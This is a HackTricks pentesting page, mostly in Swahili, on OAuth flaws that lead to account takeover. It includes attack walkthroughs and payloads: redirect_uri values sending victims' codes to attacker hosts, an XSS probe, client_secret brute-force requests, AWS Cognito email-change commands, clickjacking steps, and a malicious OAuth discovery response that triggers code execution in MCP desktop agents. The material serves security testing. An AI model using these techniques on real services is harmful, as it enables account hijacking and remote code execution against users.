# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Taarifa za Msingi <a href="#d4a8" id="d4a8"></a>

OAuth inatoa matoleo mbalimbali, na maarifa ya msingi yanapatikana kwenye [OAuth 2.0 documentation](https://oauth.net/2/). Mjadala huu unazingatia hasa [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), ukitoa **mfumo wa idhini ambao unamwezesha programu kufikia au kufanya vitendo kwenye akaunti ya mtumiaji katika programu nyingine** (the authorization server).

Fikiria tovuti ya nadharia _**https://example.com**_, iliyotengenezwa kuonyesha **machapisho yako yote ya mitandao ya kijamii**, ikiwemo yale ya kibinafsi. Ili kufanikisha hili, OAuth 2.0 inatumiwa. _https://example.com_ itaomba ruhusa yako ya **kufikia machapisho yako ya mitandao ya kijamii**. Kwa hivyo, skrini ya idhini itaonekana kwenye _https://socialmedia.com_, ikielezea **ruhusa zinazohitajika na developer anayefanya ombi**. Baada ya uthibitisho wako, _https://example.com_ itapata uwezo wa **kufikia machapisho yako kwa niaba yako**.

Ni muhimu kuelewa vipengele vifuatavyo ndani ya mfumo wa OAuth 2.0:

- **resource owner**: Wewe, kama **mtumiaji/entiti**, unatoa idhini ya kufikia rasilimali zako, kama machapisho ya akaunti yako ya mitandao ya kijamii.
- **resource server**: Seva inayosimamia **maombi yaliyothibitishwa** baada ya programu kupata `access token` kwa niaba ya `resource owner`, mfano, **https://socialmedia.com**.
- **client application**: Programu inayotafuta **idhini** kutoka kwa `resource owner`, kama **https://example.com**.
- **authorization server**: Seva inayotoa `access tokens` kwa `client application` baada ya mafanikio ya uthibitisho wa `resource owner` na upokeaji wa idhini, mfano, **https://socialmedia.com**.
- **client_id**: Kitambulisho cha umma, kipekee kwa programu.
- **client_secret:** Ufunguo wa siri, unaojulikana tu kwa programu na authorization server, unaotumika kutengeneza `access_tokens`.
- **response_type**: Thamani inayobainisha **aina ya token inayotakiwa**, kama `code`.
- **scope**: **Kiwango cha ufikiaji** ambacho `client application` inakiomba kutoka kwa `resource owner`.
- **redirect_uri**: URL ambayo mtumiaji anarudishwa baada ya idhini. Hii kwa kawaida lazima iwe sawa na redirect URL iliyosajiliwa awali.
- **state**: Kigezo cha **kuhifadhi data wakati mtumiaji anaporudishwa kwenda na kutoka kwa authorization server**. Upekee wake ni muhimu kama **mekanismo wa ulinzi wa CSRF**.
- **grant_type**: Kigezo kinachoonyesha **aina ya grant na aina ya token itakayorejeshwa**.
- **code**: Msimbo wa idhini kutoka kwa `authorization server`, unaotumika pamoja na `client_id` na `client_secret` na client application kupata `access_token`.
- **access_token**: **Token ambayo client application inatumia kwa maombi ya API** kwa niaba ya `resource owner`.
- **refresh_token**: Inamruhusu programu **kupata `access_token` mpya bila kumwuliza mtumiaji tena**.

### Mtiririko

Mtiririko halisi wa OAuth unaenda kama ifuatavyo:

1. Unaenda kwenye [https://example.com](https://example.com) na unachagua kitufe cha “Integrate with Social Media”.
2. Tovuti kisha itatuma ombi kwa [https://socialmedia.com](https://socialmedia.com) ikikuomba idhini yako ili kuruhusu programu ya https://example.com kufikia machapisho yako. Ombi limeundwa kama ifuatavyo:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Kisha unawasilishwa na ukurasa wa idhini.
4. Baada ya idhini yako, Mtandao wa Kijamii hutuma jibu kwa `redirect_uri` likiwa na vigezo vya `code` na `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com hutumia `code` hii, pamoja na `client_id` na `client_secret` yake, kutuma ombi upande wa server ili kupata `access_token` kwa niaba yako, na hivyo kuwezesha upatikanaji wa ruhusa ulizokubali:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Mwishowe, mchakato unakamilika wakati https://example.com inapotumia `access_token` yako kufanya API call kwa Mitandao ya Kijamii ili kupata

## Udhaifu <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Kwa mujibu wa [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), authorization server inapaswa kurekebisha browser tu kwa **pre-registered, exact redirect URIs**. Udhaifu wowote hapa unamruhusu mshambuliaji kumtuma mwathiriwa kupitia URL ya authorization yenye madhara ili IdP imlete `code` (na `state`) ya mwathiriwa moja kwa moja kwa endpoint ya mshambuliaji, ambaye anaweza kisha kuinunua (redeem) na kuvuna tokens.

Mtiririko wa kawaida wa shambulio:

1. Tengeneza `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` na uitume kwa mwathiriwa.
2. Mwathiriwa anathibitisha utambulisho na kuidhinisha scopes.
3. IdP inamrudisha kwa `attacker.tld/callback?code=<victim-code>&state=...` ambapo mshambuliaji anarekodi ombi na mara moja kubadilisha code.

Mende za kawaida za uthibitishaji za kuchunguza:

- **No validation** – URL yoyote kamili inakubaliwa, ikisababisha wizi wa code mara moja.
- **Weak substring/regex checks on the host** – inapita kwa kutumia lookalikes kama `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, au `match.com@evil.com`.
- **IDN homograph mismatches** – uthibitishaji hufanyika kwenye fomu ya punycode (`xn--`), lakini browser inarekebisha kwenda domain ya Unicode inayodhibitiwa na mshambuliaji.
- **Arbitrary paths on an allowed host** – kuonyesha `redirect_uri` kwa `/openredirect?next=https://attacker.tld` au endpoint yoyote ya XSS/user-content huweza kupeleka code kupitia chained redirects, Referer headers, au JavaScript iliyowekwa.
- **Directory constraints without normalization** – mifumo kama `/oauth/*` inaweza kupitishwa kwa kutumia `/oauth/../anything`.
- **Wildcard subdomains** – kukubali `*.example.com` inamaanisha takeover yoyote (dangling DNS, S3 bucket, n.k.) mara moja inatoa callback halali.
- **Non-HTTPS callbacks** – kuruhusu URI za `http://` kunampa mashambulizi ya mtandao (Wi-Fi, corporate proxy) fursa ya kunyanga code wakati wa usafirishaji.

Pia kagua vigezo vingine vya aina ya redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, n.k.) na OpenID discovery document (`/.well-known/openid-configuration`) kwa endpoints za ziada ambazo zinaweza kurithi mende sawa za uthibitishaji.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Kama ilivyotajwa katika ripoti hii ya bug bounty [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) inawezekana kwamba redirect **URL inarudishwa kwenye response** ya server baada ya mtumiaji kuthibitisha, na hivyo kuwa **nyeti kwa XSS**. Payload inayowezekana ya kujaribu:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Udhibiti usiofaa wa state parameter <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: mteja lazima atengeneze **cryptographically random value per browser instance**, aihifadhi mahali ambapo browser hiyo pekee inaweza kusoma (cookie, local storage, nk.), aiweke kwenye ombi la authorization, na kukataa mwitikio wowote ambao hautorejesha thamani ile ile. Iwapo thamani ni static, inayoweza kutabiriwa, hiari, au haifungwani na session ya mtumiaji, mshambuliaji anaweza kumaliza OAuth flow yake mwenyewe, kunasa ombi la mwisho la `?code=` (bila kulituma), na baadaye kulazimisha browser ya mwathirika kurudia ombi hilo ili akaunti ya mwathirika iunganishwe na profaili ya mshambuliaji kwenye identity provider.

The replay pattern is always the same:

1. The attacker authenticates against the IdP with their account and intercepts the last redirect containing `code` (and any `state`).
2. They drop that request, keep the URL, and later abuse any CSRF primitive (link, iframe, auto-submitting form) to force the victim browser to load it.
3. If the client does not enforce `state`, the application consumes the attacker’s authorization result and logs the attacker into the victim’s app account.

A practical checklist for `state` handling during tests:

- **Missing `state` entirely** – ikiwa parameter haitokei kabisa, login yote inaweza kuwa CSRFable.
- **`state` not required** – iondoe kutoka kwenye ombi la awali; kama IdP bado inatoa codes ambazo client inakubali, ulinzi ni opt-in.
- **Returned `state` not validated** – badilisha thamani katika majibu (Burp, MITM proxy). Kukubali values zisizolingana kunamaanisha tokeni iliyohifadhiwa haifanywi kulinganisha.
- **Predictable or purely data-driven `state`** – apps nyingi huweka redirect paths au JSON blobs ndani ya `state` bila kuchanganya randomness, kuruhusu washambuliaji kutabiri values halali na kurudia flows. Daima ongeza entropy yenye nguvu kabla/baada ya ku-encode data.
- **`state` fixation** – kama app inaruhusu watumiaji kusambaza thamani ya `state` (mfano, kupitia crafted authorization URLs) na kuitumia tena katika flow, mshambuliaji anaweza kuweka thamani inayojulikana na kuitumia tena kwa waathirika mbalimbali.

PKCE inaweza kuendeleza `state` (hasa kwa public clients) kwa kuifunga authorization code na code verifier, lakini web clients zinafaa bado kufuatilia `state` ili kuzuia bugs za cross-user CSRF/account-linking.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Washambuliaji wanaweza kuunda akaunti mapema wakitumia barua pepe ya mwathirika. Ikiwa mwathirika baadaye atatumia huduma ya mtu wa tatu kwa login, application inaweza bila kusudi kuunganisha akaunti ya mtu wa tatu na akaunti iliyotengenezwa kabla na mshambuliaji, na kusababisha upatikanaji usioidhinishwa.
2. **Exploiting Lax OAuth Email Verification**: Washambuliaji wanaweza kuchochea huduma za OAuth ambazo hazithibitishi barua pepe kwa kujiandikia na huduma yao kisha kubadilisha email ya akaunti kuwa ya mwathirika. Njia hii pia inasababisha hatari ya upatikanaji usioidhinishwa, sawa na tukio la kwanza lakini kupitia vector tofauti ya shambulio.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** kwa vitendo zinawapa cheti hicho mtu yeyote anaayeweza kupakua package. Daima angalia public clients kwa:

- Unpacking the APK/IPA, desktop installer, or Electron app and grepping for `client_secret`, Base64 blobs that decode to JSON, or hard-coded OAuth endpoints.
- Reviewing bundled config files (plist, JSON, XML) or decompiled strings for client credentials.

Mara mshambuliaji anapochota secret, wanahitaji tu kuiba authorization `code` ya mwathirika (kupitia weak `redirect_uri`, logs, nk.) ili kwa uhuru kugonga `/token` na kutengeneza access/refresh tokens bila kuhusisha app halali. Chukulia public/native clients kuwa **wasio na uwezo wa kushikilia secrets**—badala yake wanapaswa kutegemea PKCE (RFC 7636) kuthibitisha umiliki wa per-instance code verifier badala ya secret ya static. Wakati wa upimaji, thibitisha kama PKCE ni lazima na kama backend kwa kweli inakataa token exchanges ambazo hazijumuishi ama `client_secret` **or** valid `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Mara tu client anapokuwa na **code and state**, ikiwa inarudishwa ndani ya Referer header wakati anapotembelea ukurasa mwingine, basi ni dhaifu.

### Access Token Stored in Browser History

Dhamana kuu ya Authorization Code grant ni kwamba **access tokens hazifikii kamwe kwenye browser ya resource owner**. Wakati implementations zinapoleak tokens client-side, mdororo wowote (XSS, Referer leak, proxy logging) unageuka mara moja kuwa ukiukaji wa akaunti. Daima angalia:

- **Tokens in URLs** – ikiwa `access_token` inaonekana kwenye query/fragment, inaenda kwenye browser history, server logs, analytics, na Referer headers zinazotumwa kwa wahusika wengine.
- **Tokens transiting untrusted middleboxes** – kurudisha tokens kupitia HTTP au kwa proxies za debugging/corporate kunaruhusu wachunguzi wa mtandao kuzichukua moja kwa moja.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, au serialized JSON blobs zinafunua tokens kwa kila script kwenye origin (ikiwemo XSS payloads au extensions zenye nia mbaya).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` zinahifadhi tokens kwa muda mrefu baada ya logout kwenye vifaa vinavyotumika kwa pamoja na zinaweza kufikiwa na script.

Moja ya uvumbuzi hivi kawaida hubadilisha mdororo uliokuwa “low” (kama CSP bypass au DOM XSS) kuwa takeover kamili ya API kwa sababu mshambuliaji anaweza kusoma tu na kurudia kutumia leaked bearer token.

### Everlasting Authorization Code

Authorization codes lazima ziwe **za muda mfupi, matumizi-moja, na zenye kujua replay**. Unapo tathmini flow, chukua `code` na:

- **Test the lifetime** – RFC 6749 inashauri dakika, si saa. Jaribu redeem code baada ya 5–10 dakika; kama bado inafanya kazi, dirisha la exposure kwa code iliyoleak limezidi.
- **Test sequential reuse** – tuma `code` ile ile mara mbili. Ikiwa ombi la pili linarudisha token nyingine, washambuliaji wanaweza kunakili sessions bila kikomo.
- **Test concurrent redemption/race conditions** – tuma maombi mawili ya token kwa wakati mmoja (Burp intruder, turbo intruder). Issuers dhaifu wakati mwingine huruhusu zote mbili.
- **Observe replay handling** – jaribio la reuse halipaswi tu kushindwa bali pia kuvunja (revoke) token zozote zilizotolewa tayari kutoka kwa code hiyo. Vinginevyo, replay iliyogunduliwa inamwachia mshambuliaji token ya kwanza kuwa hai.

Kuchanganya code inayoruhusu replay na `redirect_uri` yoyote au mdororo wa logging kunaruhusu upatikanaji wa akaunti kwa kudumu hata baada ya mhusika kumaliza login halali.

### Authorization/Refresh Token not bound to client

Kama unaweza kupata **authorization code** na kuitumia na client tofauti basi unaweza kuchukua udhibiti wa akaunti za wengine.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Angalia chapisho hiki**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

Katika ripoti hii ya bug bounty: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) unaweza kuona kwamba **token** ambayo **AWS Cognito** inamrudishia mtumiaji inaweza kuwa na **idhini za kutosha kuandika juu ya data ya mtumiaji**. Kwa hivyo, ikiwa unaweza **kubadilisha user email kwa email tofauti**, huenda ukaweza **kuchukua udhibiti** wa akaunti za wengine.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Kutumia vibaya token za Apps nyingine <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows that expect to receive the **token** (and not a code) could be vulnerable if they not check that the token belongs to the app.

Hii ni kwa sababu **attacker** anaweza kuunda **application supporting OAuth and login with Facebook** (kwa mfano) katika application yake mwenyewe. Kisha, mara **victim** atakapo login na Facebook katika **attackers application**, **attacker** anaweza kupata **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> Kwa hiyo, ikiwa **attacker** anafanikiwa kumfanya user kuingia kwenye OAuth application yake mwenyewe, ataweza kuchukua akaunti ya **victim** katika applications zinazotarajia token na ambazo hazithibitishi kama token ilitolewa kwa app ID yao.

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ilikuwa inawezekana kumfanya victim afungue ukurasa wenye **returnUrl** inayorejeleza attackers host. Taarifa hii ingehifadhiwa katika cookie (**RU**) na katika hatua ya baadaye **prompt** itamuuliza **user** ikiwa anataka kutoa access kwa attackers host hiyo.

Ili kupitisha prompt hii, ilikuwa inawezekana kufungua tab kuanzisha **Oauth flow** ambayo itasetisha cookie hii ya RU kwa kutumia **returnUrl**, kufunga tab kabla prompt haijaonyeshwa, na kufungua tab mpya bila thamani hiyo. Kisha, **prompt won't inform about the attackers host**, lakini cookie itakuwa imewekwa kwake, hivyo **token will be sent to the attackers host** katika redirection.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), baadhi ya implementations za OAuth zinaruhusu kuonyesha parameter ya GET ya **`prompt`** kama None (**`&prompt=none`**) ili kuzuia watumiaji kuulizwa kuthibitisha access iliyotolewa katika prompt kwenye web ikiwa tayari wako logged in kwenye platform.

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), inaweza kuwa inawezekana kuonyesha parameter **`response_mode`** ili kubainisha wapi ungependa code itolewe katika URL ya mwisho:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs ni malengo mazuri ya clickjacking: ikiwa zinaweza kuwekwa ndani ya frame, attacker anaweza kuweka graphics za kawaida juu, kuficha vitufe halisi, na kudanganya watumiaji waidhinisha scopes hatari au kuunganisha accounts. Jenga PoCs ambazo:

1. Packia IdP authorization URL ndani ya `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Tumia mbinu za absolute positioning/opacity ili kulinganisha fake buttons na controls fiche za **Allow**/**Approve**.
3. Hiari kujaza kabla parameters (scopes, redirect URI) ili idhini iliyochukuliwa mara moja imfaidi attacker.

Wakati wa kujaribu hakikisha kwamba kurasa za IdP zinaandika ama `X-Frame-Options: DENY/SAMEORIGIN` au restrictive `Content-Security-Policy: frame-ancestors 'none'`. Ikiwa hakuna yaliyo imeshakuwpo, onesha hatari kwa zana kama [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) na rekodi jinsi victim anavyoruhusu app ya attacker kwa urahisi. Kwa mawazo ya payload za ziada angalia [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), hii ni OAuth flow inayoruhusu kuingia katika OAuth kupitia **username** na **password**. Ikiwa katika flow rahisi hii **token** yenye access kwa vitendo vyote mtumiaji anaweza kufanya inarudishwa basi inawezekana kupitisha 2FA kwa kutumia token hiyo.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) inaeleza jinsi ilivyowezekana kutumia **open redirect** kwa thamani kutoka **referrer** ili kutumia OAuth kwa ATO. Shambulio lilikuwa:

1. Victim anafikia attackers web page
2. Victim anafungua link hatari na opener inaanzisha Google OAuth flow na `response_type=id_token,code&prompt=none` kama parameters za ziada kwa kutumia kama **referrer the attackers website**.
3. Katika opener, baada provider kuidhinisha victim, inawarejesha kwenye thamani ya parameter ya `redirect_uri` (victim web) kwa 30X code ambayo bado inaweka attackers website katika referer.
4. Victim website inasababisha open redirect kulingana na referrer ikimwelekeza user wa victim kwenye attackers website, kwa kuwa **`respose_type`** ilikuwa **`id_token,code`**, code itatumwa nyuma kwa attacker katika **fragment** ya URL na kumuwezesha kuchukua akaunti ya user kupitia Google kwenye site ya victim.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Kwa maelezo zaidi ya mbinu hii.**

Dynamic Client Registration katika OAuth hufanya kama vector isiyoonekana lakini muhimu kwa udhaifu wa usalama, hasa kwa mashambulizi ya **SSRF**. Endpoint hii inaruhusu servers za OAuth kupokea maelezo kuhusu client applications, pamoja na URLs nyeti ambazo zinaweza kutumiwa vibaya.

Mambo Muhimu:

- **Dynamic Client Registration** mara nyingi inafungamanisha `/register` na inakubali maelezo kama `client_name`, `client_secret`, `redirect_uris`, na URLs kwa ajili ya logos au JSON Web Key Sets (JWKs) kupitia POST requests.
- Kipengele hiki kinafuata specs zilizowekwa katika **RFC7591** na **OpenID Connect Registration 1.0**, ambazo zinajumuisha parameters zinazowezekana kuwa dhaifu dhidi ya SSRF.
- Mchakato wa registration unaweza bila kukusudia kuonyesha servers kwa SSRF kwa njia kadhaa:
  - **`logo_uri`**: URL ya logo ya client application ambayo server inaweza kuitafuta, kusababisha SSRF au kusababisha XSS ikiwa URL inashughulikiwa vibaya.
  - **`jwks_uri`**: URL ya hati ya JWK ya client, ambayo ikiwa imeundwa kwa ulaghai, inaweza kusababisha server kufanya requests za outbound kwa server inayodhibitiwa na attacker.
  - **`sector_identifier_uri`**: Inarejelea array ya JSON ya `redirect_uris`, ambayo server inaweza kuitafuta, na kuunda fursa ya SSRF.
  - **`request_uris`**: Inaorodhesha request URIs zilizokubaliwa kwa client, ambazo zinaweza kutumika ikiwa server itazifetcha hizi URIs mwanzoni mwa mchakato wa authorization.

Mikakati ya Exploitation:

- SSRF inaweza kusababishwa kwa ku-register client mpya yenye URLs hatarishi katika parameters kama `logo_uri`, `jwks_uri`, au `sector_identifier_uri`.
- Wakati exploitation moja kwa moja kupitia `request_uris` inaweza kupunguzwa kwa udhibiti wa whitelists, kutoa `request_uri` iliyosajiliwa mapema na inayodhibitiwa na attacker inaweza kuwezesha SSRF wakati wa awamu ya authorization.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (inayoathiri `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) inaonyesha jinsi **dynamic OAuth discovery** inavyoweza kuwa primitive ya RCE wakati client inapotuma metadata ya IdP moja kwa moja kwa operating system. Seva ya MCP ya mbali inarudisha `authorization_endpoint` inayodhibitiwa na attacker wakati wa discovery exchange (`/.well-known/openid-configuration` au RPC yoyote ya metadata). `mcp-remote ≤0.1.15` ingekuwa ikipiga call kwa system URL handler (`start`, `open`, `xdg-open`, etc.) na kamba yoyote iliyopokelewa, hivyo scheme/path yoyote inayoungwa mkono na OS ilitekelezwa kwa ndani.

Attack workflow

1. Lenga desktop agent kwa MCP/OAuth server haribifu (`npx mcp-remote https://evil`). Agent inapokea `401` pamoja na metadata.
2. The server answers with JSON such as:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Mteja ananzisha OS handler kwa URI iliyotolewa. Windows inakubali payloads kama `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux zinakubali `file:///Applications/Calculator.app/...` au hata schemes maalum kama `cmd://bash -lc '<payload>'` ikiwa zimesajiliwa.
4. Kwa sababu hili hutokea kabla ya mwingiliano wowote wa mtumiaji, **kuweka tu mteja awasiliane na server ya mshambuliaji kunasababisha utekelezaji wa msimbo**.

**Jinsi ya kujaribu**

- Lenga desktop/agent yoyote inayounga mkono OAuth inayofanya discovery kupitia HTTP(S) na kufungua endpoints zilizorejeshwa kwa ndani (Electron apps, CLI helpers, thick clients).
- Kata au uweke mwenyeji response ya discovery na ubadilishe `authorization_endpoint`, `device_authorization_endpoint`, au viwanja vinavyofanana na `file://`, `cmd://`, UNC paths, au schemes hatari nyingine.
- Angalia kama mteja unathibitisha scheme/host. Ukosefu wa uthibitisho husababisha utekelezaji mara moja chini ya muktadha wa mtumiaji na kuthibitisha tatizo.
- Rudia kwa schemes tofauti ili kuchora uso wote wa shambulio (mfano, `ms-excel:`, `data:text/html,`, custom protocol handlers) na kuonyesha upitishaji wa kuvuka majukwaa.

## OAuth providers Race Conditions

Ikiwa jukwaa unalolitest ni OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

Katika OAuth, field ya sub inaanzisha mtumiaji kwa kipekee, lakini muundo wake hutofautiana kwa kila Authorization Server. Ili kuleta muundo thabiti wa utambulisho wa mtumiaji, baadhi ya clients hutumia barua-pepe au majina ya mtumiaji. Hata hivyo, hii ni hatari kwa sababu:

- Baadhi ya Authorization Servers hawahakikisha kuwa mali hizi (kama email) zinabaki zisibadilike.
- Katika utekelezaji fulani—kama "Login with Microsoft"—client inategemea field ya email, ambayo inadhibitiwa na mtumiaji ndani ya Entra ID na haijahakikishwa.
- Mshambuliaji anaweza kufaidika na hili kwa kuunda shirika lao la Azure AD (mfano, doyensectestorg) na kulitumia kufanya Microsoft login.
- Ingawa Object ID (iliyoifadhiwa katika sub) ni isiyobadilika na salama, kutegemea field ya email inayoweza kubadilika kunaweza kuwezesha account takeover (kwa mfano, kuiba akaunti kama victim@gmail.com).

## Client Confusion Attack

Katika Client Confusion Attack, application inayotumia OAuth Implicit Flow inashindwa kuthibitisha kwamba access token ya mwisho imetengenezwa mahsusi kwa Client ID yake. Mshambuliaji ana-andaa tovuti ya umma inayotumia Google’s OAuth Implicit Flow, akamdanganya maelfu ya watumiaji kuingia na hivyo kuvuna access tokens zilizokuwa zinalengwa kwa tovuti ya mshambuliaji. Ikiwa watumiaji hawa pia wana akaunti kwenye tovuti nyingine dhaifu isiyotathmini Client ID ya token, mshambuliaji anaweza kutumia tena token zilizovunwa kuigiza wahanga na kunyakuwa akaunti zao.

## Scope Upgrade Attack

Aina ya Authorization Code Grant inahusisha mawasiliano salama server-to-server kwa kusafirisha data za mtumiaji. Hata hivyo, ikiwa Authorization Server inaamini bila wazi param ya scope katika Access Token Request (parameter isiyotajwa katika RFC), application ya uhalifu inaweza kuinua vibali vya authorization code kwa kuomba scope ya juu zaidi. Baada Access Token itakapozalishwa, Resource Server lazima iithibitishe: kwa JWT tokens, hili linajumuisha kukagua signature ya JWT na kuchambua data kama client_id na scope, wakati kwa token za string isiyokuwa na muundo wa JWT, server lazima iulize Authorization Server kupata maelezo ya token.

## Redirect Scheme Hijacking

Katika implementations za OAuth kwenye mobile, apps hutumia custom URI schemes kupokea redirects zenye Authorization Codes. Hata hivyo, kwa kuwa apps nyingi zinaweza kusajili scheme sawa kwenye kifaa, dhana kwamba client halali peke yake ndiye anayedhibiti redirect URI inavunjwa. Kwa mfano kwenye Android, URI ya Intent kama `com.example.app://` oauth inashikwa kulingana na scheme na vichujio vya hiari vilivyoainishwa kwenye intent-filter ya app. Kwa kuwa utatuzi wa intent wa Android unaweza kuwa mpana—hasa ikiwa imeelezwa scheme pekee—mshambuliaji anaweza kusajili app ya ujeuri yenye intent-filter iliyotengenezwa kwa uangalifu ili kuiba authorization code. Hii inaweza kuwezesha account takeover ama kupitia mwingiliano wa mtumiaji (wanapo apps nyingi zinazostahili kushughulikia intent) au kupitia mbinu za bypass zinazotumia vichujio vilivyo mkusudi sana, kama ilivyoelezwa kwenye flowchart ya tathmini ya Ostorlab.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
